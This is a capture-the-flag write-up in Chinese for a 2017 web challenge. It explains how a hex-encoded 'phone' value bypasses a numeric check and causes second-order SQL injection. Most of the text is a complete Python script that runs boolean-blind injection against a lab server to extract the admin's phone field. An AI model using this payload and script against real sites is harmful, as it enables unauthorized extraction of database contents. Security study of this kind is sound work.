# CNAS/MPS CTF 2017: Malicious Code Protection 

**Points:** 200

> 安全主管部门告诉你这个网站的phone参数有问题，但具体什么问题没说，请根据你丰富的经验找到该网站的漏洞并复现。

> [PutResourceHere](PutResourceHere)  

## Write-up

首先检查了基本的username和password注入可行性，失败。

然后根据题目提示检查了phone参数，实际上并没有长度限制，`maxlength`是前端的限制。

尝试了一下phone为非数字字符，提示必须为数字。试了一下`phone=.1`，注册成功，估计后台校验用的是`is_numeric`。于是再试了一下`phone=0x61626364'，注册成功并且登录后提示phone为abcd，但是在check有多少相同的phone的时候却出现了db error!的提示。

思考了一会儿，猜测后台逻辑是直接`INSERT INTO table VALUES ('$username', '$password', $phone)`，这之后再从数据库里SELECT出phone存储到php的`$_SESSION`中，最后检查多少phone相同的时候直接用`$_SESSION`中的phone拼接到SQL语句中，于是就有`SELECT COUNT(*) FROM table WHERE phone=$_SESSION[phone]`这样的语句。这样，当我注册phone为0x61626364的时候数据库中由于不存在abcd字段名就报错了。

剩下就清晰了，不过由于没有其它回显，只有提示多少电话号码相同的一个回显，就只能盲注。通过不停注册帐号来爆破admin的phone，写了个python脚本。

```python
import requests
from binascii import unhexlify, hexlify
import re
from random import shuffle


error = '<!DOCTYPE html>\n<html>\n<head>\n\t<title>Check</title>\n</head>\n<body>\n<div class="text" style=" text-align:center;">There only 1 people use the same phone as you</div><!-- å\x90¬è¯´adminç\x9a\x84ç\x94µè¯\x9dè\x97\x8fç\x9d\x80å¤§ç§\x98å¯\x86å\x93¦ï½\x9e-->\n</body>\n</html>'
alert = re.compile(r'alert\((.*?)\)')

# charsets
alnum = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYz0123456789'
digit = '0123456789'

payload = "{rand}||username='admin'&&ASCII(MID(phone,{offset},1))>={guess}"


def randstr(charset):
    charset = list(charset)
    shuffle(charset)
    return ''.join(charset)


def str2hex(string):
    return hexlify(string.encode()).decode()


def register(user):
    url = 'http://172.16.5.155/register.php'
    find = alert.findall(requests.post(url, user).text)
    if find:
        raise Exception(*find)


def login(user):
    session = requests.session()
    url = 'http://172.16.5.155/login.php'
    find = alert.findall(session.post(url, user).text)
    if find:
        raise Exception(*find)
    return session


def check(session, user):
    url = 'http://172.16.5.155/check.php'
    resp = session.get(url).text
    if resp.find('db error!') != -1:
        raise Exception('db error!')
    return resp


def getflag(offset):
    bnd = [0x20, 0x80]
    while bnd[0] + 1 != bnd[1]:
        m = bnd[0] + bnd[1] >> 1
        # generate random phone number so that there will
        # be only 1 user (myself) have same phone number as mine.
        randphone = randstr(digit)
        user = {
            'username': randstr(alnum),
            'password': 'f4K3@Pa55wOrd*ha//hei-ho',
            'phone': '0x' + str2hex(payload.format(
                rand=randphone,
                offset=offset,
                guess=m)),
        }
        register(user)
        session = login(user)
        resp = check(session, user)
        bnd[int(resp == error)] = m
    return chr(bnd[0])


if __name__ == '__main__':
    offset = 1
    while True:  # Just hit Ctrl+C manually to exit.
        print(getflag(offset), end='', flush=True)
        offset += 1
```

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/>
